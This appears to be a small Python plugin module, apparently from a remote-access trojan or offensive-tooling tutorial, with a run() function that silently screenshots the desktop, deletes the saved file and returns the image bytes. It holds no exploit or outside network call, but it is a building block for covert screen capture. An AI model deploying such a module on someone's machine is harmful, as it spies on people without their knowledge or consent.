import os
import pyautogui

def run(**args):
    print("[*] Taking screenshot.")
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.jpg")
    
    with open("screenshot.jpg", "rb") as f:
        image_bytes = f.read()
    
    os.remove("screenshot.jpg")
    
    return image_bytes
